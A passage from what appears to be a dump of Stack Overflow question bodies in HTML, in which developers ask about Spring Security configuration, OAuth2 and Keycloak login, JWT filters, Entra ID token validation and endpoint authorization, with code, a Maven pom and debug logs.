I have prior experience with Vaadin from another plain Java application, but I'm new to using Spring, Spring Security and OAuth2/Keycloak.</p>
<p>I think the flow should be:</p>
<ol>
<li>A user tries to log into the UI.</li>
<li>The UI connects to Keycloak for a specified Realm and tries to authenticate the User.</li>
<li>If sucessful, the User is logged in.</li>
<li>The application now calls the API to load some data to display by using the Users access token.</li>
<li>The API verifies the token and returns this users data.</li>
</ol>
<p>I managed to implement the login for the user following these blogs:
<a href=""https://martinelli.ch/vaadin-oauth2-and-keycloak/"" rel=""nofollow noreferrer"">https://martinelli.ch/vaadin-oauth2-and-keycloak/</a>
<a href=""https://rene-wilby.de/blog/hilla-oauth-authorization-code-flow-keycloak/"" rel=""nofollow noreferrer"">https://rene-wilby.de/blog/hilla-oauth-authorization-code-flow-keycloak/</a></p>
<pre><code>@EnableWebSecurity
@Configuration
public class SecurityConfiguration extends VaadinWebSecurity {

    private final KeycloakLogoutHandler keycloakLogoutHandler;

    public SecurityConfiguration(KeycloakLogoutHandler keycloakLogoutHandler) {
        this.keycloakLogoutHandler = keycloakLogoutHandler;
    }

    @Override
    protected void configure(HttpSecurity http) throws Exception {

        http.authorizeHttpRequests(
                authorize -&gt; authorize.requestMatchers(new AntPathRequestMatcher(&quot;/images/*.png&quot;)).permitAll());

        // Icons from the line-awesome addon
        http.authorizeHttpRequests(authorize -&gt; authorize
                .requestMatchers(new AntPathRequestMatcher(&quot;/line-awesome/**/*.svg&quot;)).permitAll());

        http.oauth2Login(Customizer.withDefaults()).logout( logout -&gt;
                logout.addLogoutHandler(keycloakLogoutHandler)

        );

        super.configure(http);

        setOAuth2LoginPage(http, &quot;/oauth2/authorization/keycloak&quot;);
    }

    @Bean
    public GrantedAuthoritiesMapper userAuthoritiesMapperForKeycloak() {
        return authorities -&gt; {
            Set&lt;GrantedAuthority&gt; mappedAuthorities = new HashSet&lt;&gt;();
            var authority = authorities.iterator().next();
            if (authority instanceof OidcUserAuthority oidcUserAuthority) {
                var userInfo = oidcUserAuthority.getUserInfo();
                if (userInfo.hasClaim(&quot;realm_access&quot;)) {
                    var realmAccess = userInfo.getClaimAsMap(&quot;realm_access&quot;);
                    var roles = (Collection&lt;String&gt;) realmAccess.get(&quot;roles&quot;);
                    mappedAuthorities.addAll(roles.stream()
                            .map(role -&gt; new SimpleGrantedAuthority(&quot;ROLE_&quot; + role.toUpperCase()))
                            .toList());
                }
            }
            return mappedAuthorities;
        };
    }
}
</code></pre>
<p>I receive an OicdUser and am able to access it's information. However, the OicdUser only contains an ID-Token, which is not what should be sent to the API (from my understanding).</p>
<p>How can I receive the access-token and use it to make a request to the backend API?
Is that a proper approach to the problem or do I have some misunderstandings?</p>
<p>Thanks in advance!</p>
"
"<p>I'm trying to connect my <code>WebClient</code> to a Spring OAuth2 authorization server, and I'm using Spring Security 6. My goal is to obtain an access token programmatically. However, I'm having trouble figuring out the correct approach. Can someone provide guidance or an example of how to achieve this?</p>
<p>I've already set up my authorization server using Spring Security 6's OAuth2 features, and it seems to be working fine. Now, I need to make requests to this server from my WebClient to obtain access tokens for subsequent API calls.</p>
<p>Any insights, code snippets, or tutorials would be greatly appreciated.</p>
<p>I am trying the code from below URL:</p>
<p><a href=""https://www.baeldung.com/spring-webclient-oauth2"" rel=""nofollow noreferrer"">https://www.baeldung.com/spring-webclient-oauth2</a></p>
<p>and it is failing saying access denied on below steps.</p>
<pre><code>HTTP/1.1 302 Found
Location: http://localhost:8085/oauth/authorize?response_type=code&amp;client_id=bael-client-id&amp;state=qwdjnjcncxcxcxncwiewe&amp;redirect_uri=http://localhost:8080/login/oauth2/code/bael
</code></pre>
"
"<p>i've seen many different answers to this and just want some clarification, i use MERN but im sure the answer will be similar if not identical for other stacks/technologies. The way i see it using https post requests with the credentials in the body and then salt/hashing the password server side before storing it in the database and then salt/hash and compare when the user wants to login is safe.I have been told that this method is insecure although the only improvement i can see would be hashing client side before sending to the server(but i see the issues with this too).</p>
<p>I am using jwt and session cookies to maintain login status and using a custom middleware to verify user authentication and authorisation before sending a response from the server either with the request or redirecting if the user has invalid details. I know it is a rather vague question but any help in the form of suggestions/ links would be much appreciated.</p>
"
"<p>I have configured the entra ID in the Azure portal and in my Web API tenant. I can successfully obtain the access token, but when I use it with my Web API request, I get this error: Bearer error=&quot;invalid_token&quot;, error_description=&quot;The signature key was not found&quot;. I checked this token on jwt.io and there seems to be something wrong with the signature part of the token that came to me from Entra ID.</p>
<p><a href=""https://i.stack.imgur.com/LSAD1.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/LSAD1.png"" alt=""Invalid Signature"" /></a></p>
<p>This application in the Azure portal was not created by my own. I tried creating a new one myself and everything works fine. I double checked every setting and everything seems similar.</p>
<p>What could be causing this problem? Could be the problem with Entra ID configuration on azure portal?</p>
"
"<p>I have an API using Spring boot that previously it would use two auth methods, API KEY and JWT, it was working but suddenly it stopped. I didn't change anything but I can't fix it.</p>
<pre><code>import br.rutiquewiski.HealthBridge.infra.security.configuration.api_key.KeySecurityFilter;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;
import org.springframework.core.annotation.Order;
import org.springframework.security.authentication.AuthenticationManager;
import org.springframework.security.config.annotation.authentication.configuration.AuthenticationConfiguration;
import org.springframework.security.config.annotation.web.builders.HttpSecurity;
import org.springframework.security.config.annotation.web.configuration.EnableWebSecurity;
import org.springframework.security.config.annotation.web.configurers.AbstractHttpConfigurer;
import org.springframework.security.config.http.SessionCreationPolicy;
import org.springframework.security.crypto.bcrypt.BCryptPasswordEncoder;
import org.springframework.security.crypto.password.PasswordEncoder;
import org.springframework.security.web.SecurityFilterChain;
import org.springframework.security.web.authentication.UsernamePasswordAuthenticationFilter;
import org.springframework.security.web.util.matcher.AntPathRequestMatcher;


@Configuration
@EnableWebSecurity
public class SecurityConfiguration {

    @Configuration
    @EnableWebSecurity
    @Order(1)
    public static class ApiKeySecurityConfiguration {

        //Api key auth, any endpoint with key in the url uses authentication with api key instead of the jwt token

        @Autowired
        private KeySecurityFilter keySecurityFilter;

        @Bean
        public SecurityFilterChain apiKeySecurityFilterChain(HttpSecurity httpSecurity) throws Exception {
            return httpSecurity
                    .csrf(AbstractHttpConfigurer::disable)
                    .sessionManagement(session -&gt; session.sessionCreationPolicy(SessionCreationPolicy.STATELESS))
                    .authorizeHttpRequests(auth -&gt; {
                                auth.requestMatchers(&quot;/v3/api-docs/**&quot;, &quot;/swagger-ui.html&quot;, &quot;/swagger-ui/**&quot;).permitAll();
                                auth.requestMatchers( AntPathRequestMatcher.antMatcher(&quot;/api/key/**&quot;) ).authenticated();
                            }
                    )
                    .addFilterBefore(keySecurityFilter, UsernamePasswordAuthenticationFilter.class)
                    .build();
        }

        @Bean
        public AuthenticationManager authenticationManager(AuthenticationConfiguration authenticationConfiguration) throws Exception {
            return  authenticationConfiguration.getAuthenticationManager();
        }

    }

    @EnableWebSecurity
    @Configuration
    @Order(2)  //This annotation sets this configuration to be the second one in the auth order
    public static class StandardSecurityConfiguration {

        //Regular token auth

        @Autowired
        private TokenSecurityFilter tokenSecurityFilter;

        @Bean
        public SecurityFilterChain tokenSecurityFilterChain(HttpSecurity httpSecurity) throws Exception {
            return httpSecurity.csrf(AbstractHttpConfigurer::disable)
                    .sessionManagement(session -&gt; session.sessionCreationPolicy(SessionCreationPolicy.STATELESS))
                    .authorizeHttpRequests(auth -&gt; {
                        auth.requestMatchers(&quot;/v3/api-docs/**&quot;, &quot;/swagger-ui.html&quot;, &quot;/swagger-ui/**&quot;).permitAll();
                        auth.anyRequest().authenticated();
                    })
                    .addFilterBefore(tokenSecurityFilter, UsernamePasswordAuthenticationFilter.class)
                    .build();
        }

        @Bean
        public AuthenticationManager authenticationManager2(AuthenticationConfiguration authenticationConfiguration) throws Exception {
            return  authenticationConfiguration.getAuthenticationManager();
        }

        @Bean
        public PasswordEncoder passwordEncoder() {
            return new BCryptPasswordEncoder();
        }

    }

}
</code></pre>
<pre><code>    &lt;parent&gt;
        &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;
        &lt;artifactId&gt;spring-boot-starter-parent&lt;/artifactId&gt;
        &lt;version&gt;3.2.2&lt;/version&gt;
        &lt;relativePath/&gt; &lt;!-- lookup parent from repository --&gt;
    &lt;/parent&gt;
    &lt;groupId&gt;br.rutiquewiski&lt;/groupId&gt;
    &lt;artifactId&gt;HealthBridge&lt;/artifactId&gt;
    &lt;version&gt;1.0.0&lt;/version&gt;
    &lt;name&gt;HealthBridge&lt;/name&gt;
    &lt;description&gt;API project por health care system&lt;/description&gt;
    &lt;properties&gt;
        &lt;java.version&gt;21&lt;/java.version&gt;
    &lt;/properties&gt;
    &lt;dependencies&gt;
        &lt;dependency&gt;
            &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;
            &lt;artifactId&gt;spring-boot-starter-data-jpa&lt;/artifactId&gt;
        &lt;/dependency&gt;
        &lt;dependency&gt;
            &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;
            &lt;artifactId&gt;spring-boot-starter-validation&lt;/artifactId&gt;
        &lt;/dependency&gt;
        &lt;dependency&gt;
            &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;
            &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt;
        &lt;/dependency&gt;
        &lt;dependency&gt;
            &lt;groupId&gt;org.flywaydb&lt;/groupId&gt;
            &lt;artifactId&gt;flyway-core&lt;/artifactId&gt;
        &lt;/dependency&gt;
        &lt;dependency&gt;
            &lt;groupId&gt;org.flywaydb&lt;/groupId&gt;
            &lt;artifactId&gt;flyway-mysql&lt;/artifactId&gt;
        &lt;/dependency&gt;

        &lt;dependency&gt;
            &lt;groupId&gt;com.mysql&lt;/groupId&gt;
            &lt;artifactId&gt;mysql-connector-j&lt;/artifactId&gt;
            &lt;scope&gt;runtime&lt;/scope&gt;
        &lt;/dependency&gt;
        &lt;dependency&gt;
            &lt;groupId&gt;org.projectlombok&lt;/groupId&gt;
            &lt;artifactId&gt;lombok&lt;/artifactId&gt;
            &lt;optional&gt;true&lt;/optional&gt;
        &lt;/dependency&gt;
        &lt;dependency&gt;
            &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;
            &lt;artifactId&gt;spring-boot-starter-test&lt;/artifactId&gt;
            &lt;scope&gt;test&lt;/scope&gt;
        &lt;/dependency&gt;
        &lt;dependency&gt;
            &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;
            &lt;artifactId&gt;spring-boot-starter-security&lt;/artifactId&gt;
        &lt;/dependency&gt;
        &lt;dependency&gt;
            &lt;groupId&gt;org.springframework.security&lt;/groupId&gt;
            &lt;artifactId&gt;spring-security-test&lt;/artifactId&gt;
            &lt;scope&gt;test&lt;/scope&gt;
        &lt;/dependency&gt;
        &lt;dependency&gt;
            &lt;groupId&gt;com.auth0&lt;/groupId&gt;
            &lt;artifactId&gt;java-jwt&lt;/artifactId&gt;
            &lt;version&gt;4.4.0&lt;/version&gt;
        &lt;/dependency&gt;
        &lt;dependency&gt;
            &lt;groupId&gt;org.springdoc&lt;/groupId&gt;
            &lt;artifactId&gt;springdoc-openapi-starter-webmvc-ui&lt;/artifactId&gt;
            &lt;version&gt;2.2.0&lt;/version&gt;
        &lt;/dependency&gt;
    &lt;/dependencies&gt;

    &lt;build&gt;
        &lt;plugins&gt;
            &lt;plugin&gt;
                &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;
                &lt;artifactId&gt;spring-boot-maven-plugin&lt;/artifactId&gt;
                &lt;configuration&gt;
                    &lt;excludes&gt;
                        &lt;exclude&gt;
                            &lt;groupId&gt;org.projectlombok&lt;/groupId&gt;
                            &lt;artifactId&gt;lombok&lt;/artifactId&gt;
                        &lt;/exclude&gt;
                    &lt;/excludes&gt;
                &lt;/configuration&gt;
            &lt;/plugin&gt;
        &lt;/plugins&gt;
    &lt;/build&gt;

&lt;/project&gt;
</code></pre>
<p>I have tried every simple solution. Currently, if the api key auth config is not commented, the other one doesn't work, if I comment the api key config then the jwt works. I have tried changing the order already</p>
"
"<p>When using react for frontend and spring for backend the permitAll() is not working.</p>
<pre><code>@Configuration
@AllArgsConstructor
@EnableWebSecurity
public class Config {

    ...
    
    @Bean
    public SecurityFilterChain securityFilterChain(HttpSecurity http) throws Exception{
        http.csrf(csrf -&gt; csrf.disable())
        .authorizeHttpRequests(config -&gt; config
        .requestMatchers(&quot;/signIn&quot;, &quot;/signUp&quot;).permitAll()
        .requestMatchers(HttpMethod.POST, &quot;/api/**&quot;).permitAll()
        .anyRequest().authenticated());
        return http.build();
    }
}
</code></pre>
<p>The endpoint handling for GET requests is managed by React</p>
<pre><code>function App() {
  return (
    &lt;BrowserRouter&gt;
      &lt;Routes&gt;
          &lt;Route element={&lt;Home /&gt;} path='/home'/&gt;
          &lt;Route element={&lt;SignUp /&gt;} path='/signUp'/&gt;
          &lt;Route element={&lt;SignIn /&gt;} path='/signIn'/&gt;
          &lt;Route element={&lt;h1&gt;DEF&lt;/h1&gt;} path=&quot;*&quot;/&gt;
        &lt;/Routes&gt;
    &lt;/BrowserRouter&gt;
  );
}
</code></pre>
<p>while specifying that endpoints &quot;/signIn&quot; and &quot;/signUp&quot; should be &quot;public&quot; when trying to load that page the browser returns 403 code.</p>
<p>To connect react and spring i'm using the frontend-maven-plugin</p>
<p>I've tried doing it like that</p>
<pre><code> http.csrf(csrf -&gt; csrf.disable())
        .authorizeHttpRequests(config -&gt; config
        .requestMatchers(&quot;/**&quot;).permitAll()
        .requestMatchers(HttpMethod.POST, &quot;/api/**&quot;).permitAll()
        .requestMatchers(&quot;/securedEndpoint&quot;).authenticated());
        return http.build();
</code></pre>
<p>which works until you try to access /securedEndpoint which is now &quot;public&quot; due to <code>.requestMatchers(&quot;/**&quot;).permitAll()</code></p>
<p><strong>EDIT:</strong></p>
<p>After looking at debug logs i managed to fix it by adding &quot;/index.html&quot; to the requestMatchers but now the content form react wont render which leaves me with blank pages.</p>
<p>The logs:</p>
<pre><code>2024-02-22T16:54:13.428+01:00  INFO 13828 --- [           main] c.e.webChatApp.WebChatAppApplication     : Started WebChatAppApplication in 2.919 seconds (process running for 3.25)
2024-02-22T16:56:04.606+01:00  INFO 13828 --- [nio-8080-exec-1] o.a.c.c.C.[Tomcat].[localhost].[/]       : Initializing Spring DispatcherServlet 'dispatcherServlet'
2024-02-22T16:56:04.607+01:00  INFO 13828 --- [nio-8080-exec-1] o.s.web.servlet.DispatcherServlet        : Initializing Servlet 'dispatcherServlet'
2024-02-22T16:56:04.607+01:00 DEBUG 13828 --- [nio-8080-exec-1] o.s.web.servlet.DispatcherServlet        : Detected StandardServletMultipartResolver
2024-02-22T16:56:04.607+01:00 DEBUG 13828 --- [nio-8080-exec-1] o.s.web.servlet.DispatcherServlet        : Detected AcceptHeaderLocaleResolver
2024-02-22T16:56:04.608+01:00 DEBUG 13828 --- [nio-8080-exec-1] o.s.web.servlet.DispatcherServlet        : Detected FixedThemeResolver
2024-02-22T16:56:04.608+01:00 DEBUG 13828 --- [nio-8080-exec-1] o.s.web.servlet.DispatcherServlet        : Detected org.springframework.web.servlet.view.DefaultRequestToViewNameTranslator@51d34f02
2024-02-22T16:56:04.609+01:00 DEBUG 13828 --- [nio-8080-exec-1] o.s.web.servlet.DispatcherServlet        : Detected org.springframework.web.servlet.support.SessionFlashMapManager@4505015b     
2024-02-22T16:56:04.609+01:00 DEBUG 13828 --- [nio-8080-exec-1] o.s.web.servlet.DispatcherServlet        : enableLoggingRequestDetails='false': request parameters and headers will be masked to prevent unsafe logging of potentially sensitive data
2024-02-22T16:56:04.609+01:00  INFO 13828 --- [nio-8080-exec-1] o.s.web.servlet.DispatcherServlet        : Completed initialization in 2 ms
2024-02-22T16:56:04.625+01:00 DEBUG 13828 --- [nio-8080-exec-1] o.s.web.servlet.DispatcherServlet        : GET &quot;/&quot;, parameters={}
2024-02-22T16:56:04.639+01:00 DEBUG 13828 --- [nio-8080-exec-1] o.s.w.s.v.ContentNegotiatingViewResolver : Selected 'text/html' given [text/html, application/xhtml+xml, image/avif, image/webp, image/apng, application/xml;q=0.9, */*;q=0.8, application/signed-exchange;v=b3;q=0.7]
2024-02-22T16:56:04.639+01:00 DEBUG 13828 --- [nio-8080-exec-1] o.s.w.servlet.view.InternalResourceView  : View name 'forward:', model {}
2024-02-22T16:56:04.641+01:00 DEBUG 13828 --- [nio-8080-exec-1] o.s.w.servlet.view.InternalResourceView  : Forwarding to [index.html]
2024-02-22T16:56:04.647+01:00 DEBUG 13828 --- [nio-8080-exec-1] o.s.web.servlet.DispatcherServlet        : &quot;FORWARD&quot; dispatch for GET &quot;/index.html&quot;, parameters={}
2024-02-22T16:56:04.648+01:00 DEBUG 13828 --- [nio-8080-exec-1] o.s.w.s.handler.SimpleUrlHandlerMapping  : Mapped to ResourceHttpRequestHandler [classpath [META-INF/resources/], classpath [resources/], classpath [static/], classpath [public/], ServletContext [/]]
2024-02-22T16:56:04.655+01:00 DEBUG 13828 --- [nio-8080-exec-1] o.s.web.servlet.DispatcherServlet        : Exiting from &quot;FORWARD&quot; dispatch, status 200
2024-02-22T16:56:04.657+01:00 DEBUG 13828 --- [nio-8080-exec-1] o.s.web.servlet.DispatcherServlet        : Completed 200 OK
2024-02-22T16:56:13.849+01:00 DEBUG 13828 --- [nio-8080-exec-7] o.s.web.servlet.DispatcherServlet        : GET &quot;/signIn&quot;, parameters={}
2024-02-22T16:56:13.850+01:00 DEBUG 13828 --- [nio-8080-exec-7] s.w.s.m.m.a.RequestMappingHandlerMapping : Mapped to com.example.webChatApp.MainController#forward()
2024-02-22T16:56:13.858+01:00 DEBUG 13828 --- [nio-8080-exec-7] o.s.w.s.v.ContentNegotiatingViewResolver : Selected 'text/html' given [text/html, application/xhtml+xml, image/avif, image/webp, image/apng, application/xml;q=0.9, */*;q=0.8, application/signed-exchange;v=b3;q=0.7]
2024-02-22T16:56:13.858+01:00 DEBUG 13828 --- [nio-8080-exec-7] o.s.w.servlet.view.InternalResourceView  : View name 'forward:', model {}
2024-02-22T16:56:13.858+01:00 DEBUG 13828 --- [nio-8080-exec-7] o.s.w.servlet.view.InternalResourceView  : Forwarding to [/]
2024-02-22T16:56:13.859+01:00 DEBUG 13828 --- [nio-8080-exec-7] o.s.web.servlet.DispatcherServlet        : &quot;FORWARD&quot; dispatch for GET &quot;/&quot;, parameters={}
2024-02-22T16:56:13.860+01:00 DEBUG 13828 --- [nio-8080-exec-7] o.s.w.s.v.ContentNegotiatingViewResolver : Selected 'text/html' given [text/html, application/xhtml+xml, image/avif, image/webp, image/apng, application/xml;q=0.9, */*;q=0.8, application/signed-exchange;v=b3;q=0.7]
2024-02-22T16:56:13.860+01:00 DEBUG 13828 --- [nio-8080-exec-7] o.s.w.servlet.view.InternalResourceView  : View name 'forward:', model {}
2024-02-22T16:56:13.860+01:00 DEBUG 13828 --- [nio-8080-exec-7] o.s.w.servlet.view.InternalResourceView  : Forwarding to [index.html]
2024-02-22T16:56:13.861+01:00 DEBUG 13828 --- [nio-8080-exec-7] o.s.web.servlet.DispatcherServlet        : &quot;FORWARD&quot; dispatch for GET &quot;/index.html&quot;, parameters={}
2024-02-22T16:56:13.861+01:00 DEBUG 13828 --- [nio-8080-exec-7] o.s.w.s.handler.SimpleUrlHandlerMapping  : Mapped to ResourceHttpRequestHandler [classpath [META-INF/resources/], classpath [resources/], classpath [static/], classpath [public/], ServletContext [/]]
2024-02-22T16:56:13.863+01:00 DEBUG 13828 --- [nio-8080-exec-7] o.s.web.servlet.DispatcherServlet        : Exiting from &quot;FORWARD&quot; dispatch, status 200
2024-02-22T16:56:13.863+01:00 DEBUG 13828 --- [nio-8080-exec-7] o.s.web.servlet.DispatcherServlet        : Exiting from &quot;FORWARD&quot; dispatch, status 200
2024-02-22T16:56:13.864+01:00 DEBUG 13828 --- [nio-8080-exec-7] o.s.web.servlet.DispatcherServlet        : Completed 200 OK
</code></pre>
<p><strong>EDIT 2:</strong>
adding &quot;/static/**&quot; to requestMatchers fixed the render issue but now i can access the endpoint which needs to be authenticated when using the react routing</p>
"
"<p>I am trying to establish authentication with GitHub in the Spring Cloud dataflow server.
referring this document <a href=""https://docs.spring.io/spring-cloud-dataflow/docs/current/reference/htmlsingle/#configuration-security-oauth2"" rel=""nofollow noreferrer"">https://docs.spring.io/spring-cloud-dataflow/docs/current/reference/htmlsingle/#configuration-security-oauth2</a>
It's clearly mention <strong>As of Spring Cloud Data Flow 2.0, OAuth2 is the only mechanism for providing authentication and authorization.</strong>
So I have configured GiyHUb auth below is my application.yml file</p>
<pre><code>    info:
  app:
    name: &quot;@project.artifactId@&quot;
    description: &quot;@project.name@&quot;
    version: &quot;@project.version@&quot;
spring:
  jpa:
    hibernate:
      ddl-auto: none
server:
  port: 8443
  ssl:
    enabled: true
    key-alias: dataflow
    key-store: \path\dataflow.keystore
    key-store-type: jks
    key-store-password: dataflow
    key-password: dataflow
security:
  oauth2:
    client:
      registration:
        github: 
          client-id: client_id
          client-secret: xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
          access-token-uri: https://github.com/login/oauth/access_token
          user-authorization-uri: https://github.com/login/oauth/authorize
      resource:
        user-info-uri: https://api.github.com/user
management:
  contextPath: /management
  security:
    enabled: true      
    
</code></pre>
<p>after the build when I hit <strong>https://localhost:8443/about</strong> page
the security info</p>
<pre><code>&quot;authenticationEnabled&quot;: false,
&quot;authenticated&quot;: false,
&quot;username&quot;: null,
&quot;roles&quot;: []
},
</code></pre>
<p>Can anyone tell me if this correct configuration or if I need to only go with <strong>uaa</strong> authentication?</p>
"
"<p>I need to authenticate/authorize a Spring Boot application with Keycloak using multiple Realms.</p>
<p>So if the request is https://server/realm1/api.json then the realm [realm1] on Keycloak will be used, if the request is https://server/realmXYZ/api.json then the realm [realmXYZ] will be used.</p>
<p><strong>Have done</strong></p>
<p>With the following configuration (I'm using a old Keycloak 15.02)</p>
<pre><code># Resource Server
spring.security.oauth2.resourceserver.jwt.issuer-uri=http://localhost:8180/auth/realms/realm1
# Client Registration
spring.security.oauth2.client.registration.keycloak.client-id=my-client
spring.security.oauth2.client.registration.keycloak.authorization-grant-type=authorization_code
spring.security.oauth2.client.registration.keycloak.scope=openid
# Client Provider
spring.security.oauth2.client.provider.keycloak.issuer-uri=http://localhost:8180/auth/realms/realm1
spring.security.oauth2.client.provider.keycloak.user-name-attribute=preferred_username
</code></pre>
<p>and the following configuration class</p>
<pre><code>@Configuration
@EnableWebSecurity
@ConditionalOnProperty(name = &quot;keycloak.enabled&quot;, havingValue = &quot;true&quot;, matchIfMissing = true)
public class WebSecurityConfig {

    @Bean
    public SecurityFilterChain resourceServerFilterChain(HttpSecurity http) throws Exception {

        LOGGER.info(&quot;resourceServerFilterChain - Start&quot;);
        http.authorizeHttpRequests(auth -&gt; auth
                // Token authentication
                .requestMatchers(ALLOWED_API_LIST).permitAll()
                // Single Sign Out
                .requestMatchers(&quot;/sso-logout&quot;).permitAll()
                .anyRequest().authenticated()
        );

        // ResourceServer setting
        http.oauth2ResourceServer(oauth2 -&gt; oauth2
                .jwt(withDefaults()));

        // Client setting - shows the login screen
        http.oauth2Login(withDefaults());

        // Client setting - add logout handler
        http.logout(logout -&gt; logout.addLogoutHandler(keycloakLogoutHandler).logoutSuccessUrl(&quot;/&quot;));
    }
}
</code></pre>
<p>I'm able to login with the [realm1].
When the user is unauthenticated the Keycloak Login screen is displayed and the login process is completed.</p>
<p>As per <a href=""https://docs.spring.io/spring-security/reference/servlet/oauth2/login/core.html"" rel=""nofollow noreferrer"">https://docs.spring.io/spring-security/reference/servlet/oauth2/login/core.html</a>
I thought that using a Bean for ClientRegistrationRepository will allow me to set the authorizationUrl dynamically depending on the request.
So I wrote the following</p>
<pre><code>    @Bean
    public ClientRegistrationRepository clientRegistrationRepository() {
        return new InMemoryClientRegistrationRepository(this.customClientRegistration());
    }

    private ClientRegistration customClientRegistration() {
        return ClientRegistration.withRegistrationId(&quot;keycloak&quot;)
                .clientId(&quot;mcd-client&quot;)
//                .clientSecret(&quot;&quot;)
                .clientAuthenticationMethod(ClientAuthenticationMethod.CLIENT_SECRET_BASIC)
                .authorizationGrantType(AuthorizationGrantType.AUTHORIZATION_CODE)
                // Required
                .redirectUri(&quot;{baseUrl}&quot;)
                .scope(&quot;openid&quot;)
                .authorizationUri(&quot;http://localhost:8180/auth/realms/realm1&quot;)
                // Required
                .tokenUri(&quot;{baseUrl}/auth/realms/realm1/protocol/openid-connect/token&quot;)
//                .userInfoUri(&quot;https://www.googleapis.com/oauth2/v3/userinfo&quot;)
                .userNameAttributeName(IdTokenClaimNames.SUB)
                .jwkSetUri(&quot;http://localhost:8180/auth/realms/realm1&quot;)
                .clientName(&quot;keycloak&quot;)
                .build();
    }

</code></pre>
<p>But now Keycloak doesn't show the Login screen, instead a Json response is displayed in the browser</p>
<pre><code>{&quot;realm&quot;:&quot;realm1&quot;,&quot;public_key&quot;:&quot;M...&quot;,&quot;token-service&quot;:&quot;http...&quot;,&quot;account-service&quot;:&quot;&quot;,&quot;tokens-not-before&quot;:1677687677}}
</code></pre>
<p>Also, another problem will be how to create a new RegistrationClient depending on the Keycloak Realm if the InMemoryClientRegistrationRepository class is final.</p>
<p>Appreciate your help.</p>
"
"<p>I have spring boot application hosted in AWS. User requests will be routed to app endpoints wuth usage of AWS API Gateway. User Authentication implemented via AWS Cognito and in our case we need to configure RBAC and ABAC to endpoints of our application. We want to use Amazon Verified Permission service for authorization purposes. So, it can be helpful but I don't understand how to secure specific application endpoint, how it can be configured in <code>resource</code> section of AVP or may be this endpoint should be configure in <code>action</code> section? Maybe someone can help me with it and make it clear?</p>
"
"<p>I'm developing mobile app on Flutter as client with backend on Spring Boot. I used JWTs and store these tokens on backend in DB (table has such structure: <code>guid</code>, <code>user_guid</code>, <code>token</code>, <code>created_at</code>, <code>expired_at</code>) and in the client's DB table (session guid and token). While client performs request to the REST API, it add <code>Authorization</code> header with JWT token and custom header with session id. The server API validate this token and check if this token belonging to this user and sesion id or not. Today I've read some discussions and blogs and realized JWTs are not appropriate for my tasks. So my question is - which way I should use for authorize users with following options:</p>
<ul>
<li>store sessions in DB so user has possibility to maintain own sessions and admin has possibility to force invalidate it</li>
<li>use exactly same server-side REST API for mobile app and browser because I'm planning to develop browser version for my app</li>
<li>be secured
?</li>
</ul>
<p>Thank you.</p>
"
"<p>e.g. I have a Show Controller for my Categories, and there is an &quot;actions&quot; property I want to provide the frontend with the list of actions that the current logged-in user can do on this entity (e.g. <code>[&quot;edit&quot;, &quot;delete&quot;]</code>).</p>
<p>In the backend I want to simply give a list of Controllers (since I use <code>__invoke</code>, just passing the class name should be enough: e.g. <code>[&quot;edit&quot; =&gt; CategoryEditController::class, &quot;delete&quot; =&gt; CategoryDeleteController::class]</code>) to a function which tells me whether that controller is accessible for the user or not (e.g. <code>[&quot;edit&quot; =&gt; true, &quot;delete&quot; =&gt; false]</code>)</p>
<p>I haven't figured out yet how I can check another class's <code>IsGranted</code> which is the crucial issue I'm facing. Does anyone have an idea?</p>
<p>Also need to consider, IsGranted could not just be a string but an expression and also contain a subject. The <code>security.yaml</code> could also have constraints not directly represented in the IsGranted.</p>
"
"<p>I have a REST API built with Spring Boot and Spring Security. My question is:</p>
<p>I have a <code>AuthenticationController</code> which will have a register and login methods, I want to know where to apply my validation on the entity which will be created as a result of this request. Should I apply it on the <code>User</code> class or on the register request? If <code>User</code> class, how to apply it in this case?</p>
<p>I added the validation in on the <code>User</code> class using Jakarta validation annotations.</p>
"
"<p>To implement this, I've marked the open endpoints with permitAll, allowing access without authentication. However, when attempting to access the endpoints requiring authentication, even with a valid token, I consistently receive a 403 Forbidden response.</p>
<p><strong>JwtAuthorizationFilter Class</strong></p>
<pre><code>@Component public class JwtAuthorizationFilter extends OncePerRequestFilter {

private final JwtUtil jwtUtil;
private final ObjectMapper mapper;

public JwtAuthorizationFilter(JwtUtil jwtUtil, ObjectMapper mapper) {
    this.jwtUtil = jwtUtil;
    this.mapper = mapper;
}
@Override
protected void doFilterInternal(HttpServletRequest request, HttpServletResponse response, FilterChain filterChain) throws  IOException, ServletException {
    Map&lt;String, Object&gt; errorDetails = new HashMap&lt;&gt;();
    System.out.println(&quot;Filtering internal start&quot;);
    try {
        String accessToken = jwtUtil.resolveToken(request);
        if (accessToken == null ) {
            filterChain.doFilter(request, response);
            return;
        }
        System.out.println(&quot;token : &quot;+accessToken);
        Claims claims = jwtUtil.resolveClaims(request);

        if(claims != null &amp;&amp; jwtUtil.validateClaims(claims)){
            String email = claims.getSubject();
            //List&lt;String&gt; roles = jwtUtil.getRoles(claims);
            //List&lt;SimpleGrantedAuthority&gt; authorities = roles.stream().map(e-&gt; new SimpleGrantedAuthority(e)).toList();
            var authentication =
                    new UsernamePasswordAuthenticationToken(email,&quot;&quot;);
            authentication.setDetails(new WebAuthenticationDetailsSource().buildDetails(request));
            SecurityContextHolder.getContext().setAuthentication(authentication);
            System.out.println(authentication.getDetails());
        }

    }catch (Exception e){
        System.out.println(e.getMessage());
        errorDetails.put(&quot;message&quot;, &quot;Authentication Error&quot;);
        errorDetails.put(&quot;details&quot;,e.getMessage());
        response.setStatus(HttpStatus.FORBIDDEN.value());
        response.setContentType(MediaType.APPLICATION_JSON_VALUE);
        mapper.writeValue(response.getWriter(), errorDetails);
        response.getWriter().flush();

    }
    filterChain.doFilter(request, response);
} }
</code></pre>
<p><strong>securityFilterChain Class</strong></p>
<pre><code>    @Bean
    public SecurityFilterChain securityFilterChain(HttpSecurity http) throws Exception {
    System.out.println(&quot;SecurityFilterChain&quot;);
    http.csrf(AbstractHttpConfigurer::disable);
